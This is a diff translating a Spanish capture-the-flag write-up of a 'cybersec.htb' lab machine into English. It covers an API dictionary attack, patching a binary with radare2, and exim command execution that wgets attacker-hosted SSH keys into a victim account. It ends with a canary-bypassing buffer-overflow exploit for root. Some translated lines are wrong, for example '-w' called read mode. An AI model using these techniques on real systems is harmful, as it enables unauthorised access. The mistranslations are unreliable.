@@ -26,7 +26,7 @@ The other service present on the machine is `SSH`, which runs with
 
 ```sudo service ssh start```
 
-Para los binarios `hall` y `sec2pass` envio por separado los codigos fuentes
+For the `hall` and `sec2pass` binaries I send the source codes separately.
 
 ### Automation / Crons
 
@@ -198,26 +198,24 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 7.41 seconds
 ```
 
-Observamos que corren los servicios `SSH` y `HTTP`, asi que comenzaremos revisando el servicio web, pero antes debemos agregar al archivo `/etc/hosts`
-el dominio que nos reporta `nmap`
+We see that the `SSH` and `HTTP` services are running, so we'll start by checking the web service, but first we must add the domain reported by `nmap` to the `/etc/hosts` file.
 
 ```bash
 echo "172.17.0.2 cybersec.htb" >> /etc/hosts
 ```
-ahora si podremos consultar el servicio web
+Now we can consult the web service
 
 ![image](https://github.com/user-attachments/assets/d3951830-49b0-47e2-a78e-27984d1931b5)
 
-parece que trata sobre una empresa de ciberseguridad, si testeamos el panel de contacto no tiene nada que aportarnos, si chequeamos el codigo fuente podremos 
-observar informacion de interes
+It seems to be about a cybersecurity company. If we test the contact panel, it has nothing to offer. If we check the source code, we can see some interesting information.
 
 ![image](https://github.com/user-attachments/assets/cb06b947-6249-49ce-907f-5b80ee138581)
 
-usa una `api` para generar el mensaje de las credenciales seguras, chequeamos 
+uses an `api` to generate the secure credentials message, we check 
 
 ![image](https://github.com/user-attachments/assets/3e881c99-33e0-4133-804d-72f41ac8ddd7)
 
-vere si logro conseguir mas puntos finales por lo que aplico fuzzing
+I'll see if I can get more endpoints by fuzzing.
 
 ```bash
 feroxbuster -u http://cybersec.htb/api -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -x txt,php,bak,db,py,html,js,jpg,png,git,sh -t 200 --random-agent --no-state -d 5
@@ -248,11 +246,11 @@ by Ben "epi" Risher 🤓                 ver: 2.11.0
 [>-------------------] - 11s     7776/2491548 707/s   http://cybersec.htb/api/ 
 ```
 
-consigo un punto final mas, asi lo testeamos
+I get one more end point, so we can test it.
 
 ![image](https://github.com/user-attachments/assets/cca134ee-fc2e-4928-8041-e31b34441888)
 
-observamos que nos indica "Metodo no Permitido" por lo que debe ser `POST` asi que pruebo con `curl`
+We see that it tells us "Method not allowed" so it must be `POST` so I try with `curl`
 
 ```bash
 curl -X POST http://cybersec.htb/api/login
@@ -264,7 +262,7 @@ curl -X POST http://cybersec.htb/api/login
 <h1>Bad Request</h1>
 <p>Did not attempt to load JSON data because the request Content-Type was not &#39;application/json&#39;.</p>
 ```
-observamos que espera `Content-Type: application/json` asi que tambien espera credenciales asi que continuo testeando
+We notice that it expects `Content-Type: application/json` so it also expects credentials so I continue testing
 
 ```bash
 curl -X POST http://cybersec.htb/api/login -H "Content-Type: application/json" -d '{"username": "admin", "password": "1234"}'
@@ -274,8 +272,7 @@ curl -X POST http://cybersec.htb/api/login -H "Content-Type: application/json" -
   "message": "Invalid credentials"
 }
 ```
-ya teniendo esta base, realizare un ataque de diccionario usando usuarios por defecto como admin o administrator... para esto desarrollo un script en python, pero
-primero me creo una wordlist con los usuarios
+Now that I have this foundation, I'll perform a dictionary attack using default users like admin or administrator... For this, I'll develop a Python script, but first, I'll create a word list with the users.
 
 ```bash
 echo "admin" > users.txt && echo "administrator" >> users.txt
@@ -328,7 +325,7 @@ passwords = leer_wordlist(passwords_file)
 brute_force_attack(usernames, passwords)
 ```
 
-ejecutamos el script
+run the script
 
 ```bash
 python3 brute-force-api.py
@@ -350,7 +347,7 @@ python3 brute-force-api.py
 [-] Fallido: Usuario: admin, Contraseña: gerard
 [+] ¡Credenciales encontradas! Usuario: admin, Contraseña: undertaker
 ```
-ya con las credenciales conseguidas puedo autenticarme contra la `api` usando nuevamente `curl`
+Now with the credentials obtained I can authenticate against the `api` using `curl` again.
 
 ```bash
 curl -X POST http://cybersec.htb/api/login -H "Content-Type: application/json" -d '{"username": "admin", "password": "undertaker"}'
@@ -369,16 +366,13 @@ curl -X POST http://cybersec.htb/api/login -H "Content-Type: application/json" -
   "message": "Login successful"
 }
 ```
-por lo visto devuelve informacion de la empresa, como su direccion, clientes, sucursales, los servicios que prestan pero lo mas importante para nosotros son las url's 
-vinculadas a la empresa, asi que nos centramos en ellas para ir testeando, agragamos los subdominios al archivos `/etc/hosts` y tras probar los subdominios solo estan
-activos 2 de ellos...
+Apparently, it returns company information, such as its address, clients, branches, and the services it provides. But the most important thing for us are the URLs linked to the company, so we focused on them for testing. We added the subdomains to the `/etc/hosts` file, and after testing the subdomains, only two of them were active.
 
 ![image](https://github.com/user-attachments/assets/cd6a03b4-d59f-4626-bb32-0860ee7f5820)
 
-url's activas: `http://mail.cybersec.htb/` & `http://0internal_down.cybersec.htb/`
+active URLs: `http://mail.cybersec.htb/` & `http://0internal_down.cybersec.htb/`
 
-el subdominio del correo despues de testear la web no logro conseguir vulnerabilidades asi que revisamos el otro subdominio activo donde vemos 2 archivos, por lo que
-me descargo el archivo `.txt` y veo que tiene la siguiente informacion
+After testing the email subdomain, I couldn't find any vulnerabilities, so we checked the other active subdomain where we saw two files. I downloaded the `.txt` file and saw that it had the following information:
 
 ```bash
 At Cybersec we are committed to information security, for this reason we have developed a program so that our associates 
@@ -390,19 +384,19 @@ primary credentials when arriving at the company where they will be given the fi
 security ping and in this way, Sec2Pass will provide them with the remote access credentials necessary to perform their functions.
 ```
 
-vemos que la nota habla del segundo archivo "Sec2Pass" que resulta ser un binario y por lo que dice la nota contiene credenciales asi que lo descargo y examino
+We see that the note talks about the second file "Sec2Pass" which turns out to be a binary and from what the note says it contains credentials so it downloads and examines it
 
 ![image](https://github.com/user-attachments/assets/95757894-f200-43c4-9fa9-298b466884f1)
 
-ya que no cuento con la password para acceder a la informacion del binario, le aplicare ingenieria inversa a ver si logro extraer las credenciales que tiene
+Since I don't have the password to access the program's information, I'll reverse engineer it to see if I can extract the credentials it has.
 
 # Foothold
 
-## Ingenieria Inversa & cracking
+## Reverse Engineering & cracking
 
 ### GHIDRA
 
-comeinzo abriendo el binario con ghidra para intentar extraer informacion
+I start by opening the program with Ghidra to try to extract information.
 
 ```bash
 ghidra 
@@ -410,21 +404,19 @@ ghidra
 
 ![image](https://github.com/user-attachments/assets/680651eb-199c-4bdf-9d0a-197db57adedd)
 
-cargamos el binario y comenzamos su analisis
+We load the program and begin its analysis
 
 ![image](https://github.com/user-attachments/assets/2f0e8aff-f5c2-45d8-999d-0a2742ed0e91)
 
-tras un tiempo de analisis observo que se aplica encriptacion con `AES-256`, y observo que la funcion `qw3e7t()` se encarga de la desencriptacion, intentar 
-desencriptar la informacion seria un proceso muy complejo asi que voy a la funcion `main()` para ver cual funcion se llama despues de la validacion exitosa de
-las credenciales
+After some analysis, I notice that encryption is applied with `AES-256`, and I notice that the `qw3e7t()` function is responsible for decryption. Trying to decrypt the information would be a very complex process, so I go to the `main()` function to see which function is called after successful validation of the credentials.
 
 ![image](https://github.com/user-attachments/assets/410d463d-4188-47d5-9f06-ae516eb48b8a)
 
-se llama a la funcion `k8j4h3()` asi que intentare crackear el binario para saltarme la validacion y se llame al comienzo del `main()` la funcion `k8j4h3()`
+the `k8j4h3()` function is called so I will try to crack the binary to skip the validation and call the `k8j4h3()` function at the beginning of `main()`
 
 ### Cracking
 
-para crackear el binario usaremos `radare2`
+To crack the binary we will use `radare2`
 
 ```bash
 r2 -w sec2pass
@@ -814,16 +806,16 @@ Do you want to print 364 lines? (y/N) y
 └           0x00001f23      c3             ret
 [0x00001865]> 
 ```
-despues de abrir el binario "sec2pass" con radare2 "r2" en modo lectura "-w", lanzamos el comando `aaa` para analizar el binario, luego nos posicionamos en `main()` ejecutando
-`s main` y luego decompilamos la funcion con `pdf`, aqui en el codigo decompilado de `main` vamos a localizar la primera instruccion `CALL` y su instruccion siguiente
+After opening the binary "sec2pass" with radare2 "r2" in read mode "-w", we launch the command `aaa` to analyze the binary, then we position ourselves in `main()` by executing
+`s main` and then we decompile the function with `pdf`, here in the decompiled code of `main` we will locate the first `CALL` instruction and its following instruction
 
 ```
 │           0x000018aa      e851f8ffff     call sym.imp.strcat         ; char *strcat(char *s1, const char *s2)
 │           0x000018af      488b159a28..   mov rdx, qword [obj.PRZS]   ; [0x4150:8]=0x21b9
 ```
 
-tenemos la direccion de la primera instruccion `CALL`="0x000018aa" y la direccion de la siguiente instruccion es = "0x000018af"
-ahora necesito la direccion de la funcion que quiero llamar, es decir, la direccion de la funcion `k8j4h3()` y para localizarla ejecutamos
+We have the address of the first `CALL` instruction = "0x000018aa" and the address of the next instruction = "0x000018af"
+Now I need the address of the function I want to call, that is, the address of the `k8j4h3()` function. To locate it, we execute
 
 ```
 is~k8j4h3
@@ -832,27 +824,27 @@ is~k8j4h3
 53  0x000014ff 0x000014ff GLOBAL FUNC   870      k8j4h3
 ```
 
-entonces ya tenemos la direccion que es `0x000014ff`
+So we already have the address which is `0x000014ff`
 
-lo que necesito ahora es calcular el desplzamiento desde la funcion `k8j4h3` hasta la direccion `0x000018af`
+What I need now is to calculate the offset from the `k8j4h3` function to the address `0x000018af`
 
-calculando el desplzamiento y la direccion en base a 2
+calculating displacement and direction based on 2
 
 ```
 desp= function_dest (k8j4h3) - siguiente_direccion (0x000018af) = 0x000014ff - 0x000018af = -0x3b0
 ```
-tomamos el valor absoluto `0x3b0` y lo pasamos a binario
+We take the absolute value `0x3b0` and convert it to binary
 
 ```
 0x3b0 = 0011 1011 0000
 ```
-ahora invertimos los bit's y le sumamos +1
+Now we invert the bits and add +1
 
 ```
 1100 0100 1111 + 1 = 1100 0101 0000
 ```
 
-este resultado lo pasamos a hexadecimal
+We convert this result to hexadecimal
 
 ```bash
 echo "ibase=2; 110001010000" | bc | xargs printf '%x\n'
@@ -861,12 +853,12 @@ echo "ibase=2; 110001010000" | bc | xargs printf '%x\n'
 c50
 ```
 
-ya en este punto tenemos todo casi listo, ahora necesitmos rellenar con `f's` a la izquierda para completar 4 bytes, queda:
+At this point we have almost everything ready, now we need to fill with `f's` on the left to complete 4 bytes:
 
 ```
 ff ff fc 50
 ```
-lo pasamos a formato little-endia y le agregamos al inicio la instruccion CALL en `asm`
+We convert it to little-endia format and add the CALL instruction in `asm` at the beginning.
 
 ```
 e8 50 fc ff ff
@@ -874,27 +866,25 @@ e8 50 fc ff ff
 
 e8 = instruccion `CALL`
 
-solo nos queda reescribir la direccion donde se encuentra la primera instruccion `CALL`, es decir. `0x000018aa` con `e850fcffff`, asi que nos vamos hasta la direccion
-a sobrescribir
+We just need to rewrite the address where the first `CALL` instruction is located, i.e. `0x000018aa` with `e850fcffff`, so we go to the address
+an overwrite
 
 ```
 [0x00001865]> s 0x000018aa
 [0x000018aa]> wx e850fcffff
 [0x000018aa]> pd 1 @ 0x000018aa
 ```
-el ultimo comando debe devolvernos:
+the last command should return us:
 
 ```
 │           0x000018aa      e850fcffff     call sym.k8j4h3
 ```
 
-que seria la confirmacion de que hemos sobrescrito correctamente la direccion `0x000018aa` para llamar a la funcion `k8j4h3()`, solo queda guardar los cambios y salir,
-para eso enviamos el comando `quit` y luego ejecuto el binario `sec2pass`, si todo salio correctamente, debe quedar asi:
+which would be confirmation that we have correctly written the address `0x000018aa` to call the `k8j4h3()` function, all that remains is to save the changes and exit, for that we send the `quit` command and then execute the `sec2pass` binary, if everything went correctly, it should look like this:
 
 ![image](https://github.com/user-attachments/assets/63fae286-4fef-4d26-930c-404a799e33ea)
 
-vemos que hemos crackeado correctamente el binario extrayendo las credenciales que tenia almacenadas.. y si recordamos el reporte de `nmap` teniamos el servicio `SSH`
-corriendo, asi que tras testear las credenciales del binario logramos ganar acceso...!!!
+We see that we've successfully cracked the program by extracting the credentials. If we recall the `nmap` report, we had the `SSH` service running, so after testing the program's credentials, we were able to gain access...!!!
 
 ![image](https://github.com/user-attachments/assets/7744a944-1d19-4d25-b116-897c911baf00)
 
@@ -902,22 +892,22 @@ corriendo, asi que tras testear las credenciales del binario logramos ganar acce
 
 ## carlos
 
-leemos la flag
+read the flag
 
 ```bash
 cat user.txt
 d784fa8b6d98d27699781bd9a7cf19f0
 ```
 
-este usuario puede ejecutar el binario `exim` como el usuario `pedro`
+This user can run the `exim` program as the user `pedro`
 
 ![image](https://github.com/user-attachments/assets/ffdf87f1-ffb8-408d-bb17-b094c653bf71)
 
-el problema fue que no encontraba como abusar de este binario para escalar hasta que decidi buscar informacion en su propia documentacion
+The problem was that I couldn't find a way to abuse this program to scale, until I decided to look for information in its own documentation.
 
 ![image](https://github.com/user-attachments/assets/c36eab47-a80c-4a70-8ca3-e10dac531060)
 
-consiguiendo la forma de ejecutar comandos
+I found a way to run commands
 
 ```bash
 sudo -u pedro /usr/sbin/exim -be '${run{/bin/bash -c "whoami;id"}}'
@@ -925,8 +915,7 @@ sudo -u pedro /usr/sbin/exim -be '${run{/bin/bash -c "whoami;id"}}'
 
 ![image](https://github.com/user-attachments/assets/fc83b025-d80f-4ae1-b738-cbf6a07d9599)
 
-pero desde aqui no puedo obtener una bash directamente como `pedro` asi que voy intentar ganar acceso via `ssh` implantando en `/home/pedro/.ssh` 
-par de claves que voy a generar, asi que desde mi maquina atacante genero las claves `ssh`
+But from here I can't get a bash directly as `pedro`, so I'm going to try to gain access via `ssh` by implanting a key pair in `/home/pedro/.ssh` that I'm going to generate on my attacking machine.
 
 ```
 ssh-keygen -t rsa -b 4096
@@ -956,20 +945,20 @@ The key's randomart image is:
 +----[SHA256]-----+
 ```
 
-con el siguiente comando vamos a copias las llaves creadas a nuestro directorio actual, luego hacemos una copia de `id_rsa.pub` con el nombre `authorized_keys`
-con esto vamos a tener 3 archivos finales: id_rsa.pub, authorized_keys & id_rsa
+With the following command, we will copy the created keys to our current directory, then make a copy of `id_rsa.pub` with the name `authorized_keys`
+With this, we will have 3 final files: id_rsa.pub, authorized_keys & id_rsa
 
 ```
 cp /home/darks/.ssh/id_rsa . && cp /home/darks/.ssh/id_rsa.pub . && cp id_rsa.pub authorized_keys
 ```
 
-a continuacion, los archivos `authorized_keys` y `id_rsa.pub` los cargo en `/home/pedro/.ssh`. Para esto me levanto un server python en mi maquina atacante 
+Next, upload the `authorized_keys` and `id_rsa.pub` files to `/home/pedro/.ssh`. To do this, I set up a Python server on my machine.
 
 ```bash
 python3 -m http.server 80
 ```
 
-ahora descargo las llaves en el directorio del usuario pedro con los siguiente comandos
+Now download the keys to the user Pedro's directory with the following commands
 
 ```bash
 sudo -u pedro /usr/sbin/exim -be '${run{/bin/bash -c "wget http://172.17.0.1/authorized_keys -O /home/pedro/.ssh/authorized_keys"}}'
@@ -979,7 +968,7 @@ sudo -u pedro /usr/sbin/exim -be '${run{/bin/bash -c "wget http://172.17.0.1/aut
 sudo -u pedro /usr/sbin/exim -be '${run{/bin/bash -c "wget http://172.17.0.1/id_rsa.pub -O /home/pedro/.ssh/id_rsa.pub"}}'
 ```
 
-por ultimo validamos que los archivos esten donde deben estar con el comando
+Finally we validate that the files are where they should be with the command
 
 ```bash
 sudo -u pedro /usr/sbin/exim -be '${run{/bin/bash -c "ls -la /home/pedro/.ssh/"}}'
@@ -991,7 +980,7 @@ drwx------ 1 pedro pedro 4096 Mar 12 22:45 ..
 -rw------- 1 pedro pedro  737 Mar 12 22:54 authorized_keys
 -rw------- 1 pedro pedro  737 Mar 12 22:54 id_rsa.pub
 ```
-ya todo listo, solo queda ganar acceso via `ssh`
+Everything is ready, just gain access via `ssh`
 
 ```bash
 ssh -i id_rsa pedro@172.17.0.2
@@ -1001,7 +990,7 @@ ssh -i id_rsa pedro@172.17.0.2
 
 ## pedro
 
-en el directorio de este usuario se encuentran 2 archivos, un binario "hall" y un mail
+In this user's directory there are 2 files, a "hall" program and an email
 
 mail
 ```
@@ -1009,47 +998,44 @@ Pedro, the hall binary was found by the Inter Corp administrators and they expec
 I have enabled gdb '/usr/local/bin/secure_gdb' so that if necessary you can debug it as root and, 
 for security reasons, you know that I limit functions in the debugger to avoid problems.
 ```
-segun el mail, han habilitado gdb para ser usado con sudo a traves del script `/usr/local/bin/secure_gdb` y si chequeo puedo ejecutar dicho script como root
+According to the email, they have enabled gdb to be used with sudo through the script `/usr/local/bin/secure_gdb`
 
 ![image](https://github.com/user-attachments/assets/f5e57f92-a031-4dcd-b0f3-c14d28bfc487)
 
-intentare bypassear esto
+I'll try to overlook this.
 
 ![image](https://github.com/user-attachments/assets/c1f8ef38-431d-4dc7-b691-1e35ccbc4274)
 
-al parecer de forma externa no puedo hacer mas nada que no sea ejecutar el binario indicado, asi que intentare ejecutar comandos ya internamente en `gdb`
+It seems that externally I can't do anything other than run the indicated binary, so I will try to run commands internally in `gdb`
 
 ![image](https://github.com/user-attachments/assets/27001625-9dae-4bc5-9b06-f48eba692058)
 
-han deshabilitado la ejecucion de comandos dentro de `gdb`, por lo que parece que no sera posible inyectar comandos por esta via y escalar a root, asi que ahora me 
-centrare en el binario `hall`
+They have disabled command execution within `gdb`, so it seems that it will not be possible to inject commands via this route and escalate to root, so now I will focus on the `hall` binary.
 
 ![image](https://github.com/user-attachments/assets/e9baf55e-e94b-4a2b-8e88-fb1d566e73a0)
 
-esto parece ser el comportamiento normal del binario, ahora testeo si llega ser vulnerable a bof
+This seems to be the normal behavior of the binary, now test if it is vulnerable to bof
 
 ![image](https://github.com/user-attachments/assets/969e16f0-d8d5-4287-b093-87734cbe54e6)
 
-es vulnerable a bof y por el mensaje que se observa y resalto, tiene proteccion canary activa el binario, asi que vamos chequear las protecciones presentes, pero para
-eso me lo paso a mi maquina atacante
+It is vulnerable to BOF, and from the message that is observed and highlighted, the binary has active canary protection, so let's check the protections present, but for that, I pass it to my attacking machine.
 
 ```bash
 scp -i id_rsa pedro@172.17.0.2:/home/pedro/hall .
 ```
-el comando anterior transifere el binario hall a nuestra maquina atacante, ahora si chequeo las protecciones
+The previous command transfers the hall binary to our attacking machine, now it checks the protections
 
 ![image](https://github.com/user-attachments/assets/ec61bdfc-3cf0-463f-8d1b-622c0b3979de)
 
-cuenta con todas las protecciones activas, ahora lo abro con ghidra para analizarlo internamente
+It has all the protections active, now I open it with Ghidra to analyze it internally
 
 ![image](https://github.com/user-attachments/assets/ce396305-cdcc-4265-a984-71be5acff990)
 
-primero observe una gran cantidad de funciones que no son llamadas nunca en el programa y revisando cada una de ellas me consigo con la funcion intel() y su contenido
-llama fuertemente mi atencion, ejecuta los comandos como root dejando el sistema vulnerable y despues obteniendo una `/bin/bash`. Tambien consegui otra funcion, la funcion factor1()
+First, I noticed a large number of functions that are never called in the program. After reviewing them all, I found the intel() function and its contents. It caught my attention. It runs commands as root, leaving the system vulnerable, and then launches a `/bin/bash`. I also found another function: factor1().
 
 ![image](https://github.com/user-attachments/assets/cf962d52-bc14-4682-80e0-2a79cbb4358c)
 
-esta funcion tambien intenta ejecutar una shell, pero esta funcion no usa `system`, sino que hace uso de `execve` junto con una `/bin/sh`, esto tambien parece de interes ya `execve` y `sh` son ideales para tener mayor control sobre entornos que puedar ser corruptos, en cambio `system` y `/bin/bash` son mas restrictivos y pueden fallar con mucha facilidad en entorno corruptos, tal vez este es el motivo de la funcion `factor1`, por posibles corrupciones... aqui la idea sera intentar redirigir el flujo del programa a alguna de las 2 funciones, ya sera `intel()` o `factor1`. Corremos el binario con el depurador para ir analizandolo
+This function also tries to execute a shell, but this function does not use `system`, but rather uses `execve` along with a `/bin/sh`, this also seems of interest since `execve` and `sh` are ideal for having greater control over environments that may be corrupt, whereas `system` and `/bin/bash` are more restrictive and can fail very easily in corrupt environments, perhaps this is the reason for the `factor1` function, due to possible corruption... the idea here will be to try to redirect the program flow to one of the 2 functions, either `intel()` or `factor1`. We run the binary with the debugger to analyze it
 
 ```bash
 gdb ./hall -q
@@ -1135,17 +1121,17 @@ Dump of assembler code for function main:
    0x000055555555633a <+318>:	leave
    0x000055555555633b <+319>:	ret
 ```
-podemos ver inmediatamente donde se encuentra el `canary`
+we can immediately see where the `canary` is located
 
 ```
 0x000055555555620d <+17>:	mov    %rax,-0x8(%rbp)
 ```
 
-con `stepi` nos adelantamos hasta despues del canary
+With `stepi` we move forward until after the canary
 
 ![image](https://github.com/user-attachments/assets/67f091d2-682e-4856-9e40-a72e8a1daad5)
 
-nos movimos 4 direcciones de memoria, ya el canary se encuentra en `rbp - 0x8` por lo que podemos consultarlo
+We moved 4 memory addresses, and the canary is now located at `rbp - 0x8` so we can query it.
 
 ```bash
 (gdb) x/1gx $rbp-0x8
@@ -1153,7 +1139,7 @@ nos movimos 4 direcciones de memoria, ya el canary se encuentra en `rbp - 0x8` p
 
 ![image](https://github.com/user-attachments/assets/ab3747e1-f122-4258-b057-c4699a73e990)
 
-ya sabemos como extraer el canary, ahora para extraer la direccion de factor1(), que sera con la primera que intentare, usamos el comando
+We already know how to extract the canary, now to extract the address of factor1(), which will be the first one I will try, we use the command
 
 ```bash
 (gdb) p factor1
@@ -1162,15 +1148,15 @@ ya sabemos como extraer el canary, ahora para extraer la direccion de factor1(),
 $1 = {<text variable, no debug info>} 0x5555555560b7 <factor1>
 ```
 
-ahora validamos el offset de la entrada vulnerable para saber el tamano del buffer antes de llegar al canary
+Now we validate the offset of the vulnerable input to know the size of the buffer before reaching the canary
 
 ![image](https://github.com/user-attachments/assets/a0baaca2-641d-46ad-bdef-f83eb0420f41)
 
-el offset es de 72 bytes, asi que este datos nos servira para la contruccion del exploit.
+The offset is 72 bytes, so this data will be useful for building the exploit.
 
-ya sabemos como extraer la direccion de una funcion, ya tenemos el offset hasta el canary, tambien sabemos donde se localiza el canary y como extraerlo, esta seria toda la informacion que necesitamos extraer en tiempo de ejecucion ya que por las protecciones activas, las direcciones de memoria se aleatorizan tras cada ejecucion, por esto vamos a desarrollar el exploit para que interactue con `gdb`, bueno hay que tomar en cuenta que si en vez de apuntar a gdb directamente, apunto al script `/usr/local/bin/secure_gdb` podria ejecutar gdb como root, por lo que el binario hereda los permisos y se ejecuta como root, y si el exploit llega a funcionar, estaria obteniendo una shell como root directamente, asi que en el exploit apunto al script para ejecutar como root a gdb.
+we already know how to extract the address of a function, we already have the offset to the canary, we also know where the canary is located and how to extract it, this would be all the information that we need to extract at runtime since due to active protections, the memory addresses are randomized after each execution, for this reason we are going to develop the exploit to interact with `gdb`, well we must take into account that if instead of pointing to gdb directly, I point to the script `/usr/local/bin/secure_gdb` I could execute gdb as root, so the binary inherits the permissions and runs as root, and if the exploit works, I would be obtaining a shell as root directly, so in the exploit I point to the script to execute gdb as root.
 
-El exploit lo desarrollo para que interactue con gdb a traves del script "/usr/local/bin/secure_gdb" y de igual forma que fui extrayendo la informacion de forma manual en gdb, lo hago pero automatizando todo el proceso y usando expresiones regulares para extraer los datos que necesito en tiempo de ejecucion, el exploit queda asi:
+I developed the exploit to interact with gdb through the script "/usr/local/bin/secure_gdb" and in the same way that I extracted the information manually in gdb, I do it but automating the entire process and using regular expressions to extract the data I need at runtime, the exploit looks like this:
 
 exploit.py
 ```python
@@ -1278,11 +1264,11 @@ def atack():
 if __name__ == '__main__':
     atack()
 ```
-desarrollado el exploit, procedemos a testearlo
+Once the exploit is developed, we proceed to test it.
 
 ![image](https://github.com/user-attachments/assets/171ec9c2-a5a4-4523-83a3-9a73bdc3b753)
 
-como se observa, el exploit puede llegar a fallar y esto sucede porque se trabaja con direccion de memoria aleatorias que podrian hacer entrar en conflicto la recepcion o envio del payload, pero si intentamos nuevamente vemos que se logro ejecutar de forma exitosa obteniendo una terminal como root, pero esta terminal resulta ser muy incomoda por lo que editare el archivo "/etc/passwd"
+As you can see, the exploit can fail and this happens because it works with random memory addresses that could cause conflicts in the reception or sending of the payload, but if we try again we see that it was successfully executed, obtaining a terminal as root, but this terminal turns out to be very uncomfortable, so I will edit the "/etc/passwd" file.
 
 ![image](https://github.com/user-attachments/assets/5f2a54b3-8afa-4e70-96e4-0b1b4f14f407)
 
@@ -1291,7 +1277,7 @@ como se observa, el exploit puede llegar a fallar y esto sucede porque se trabaj
 
 ![image](https://github.com/user-attachments/assets/ccf573f1-ab9b-43a3-8b3d-f4cead486845)
 
-obtengo una mejor terminal como root y leo su flag
+I get a better terminal as root and read its flag
 
 ```bash
 cat /root/root.txt
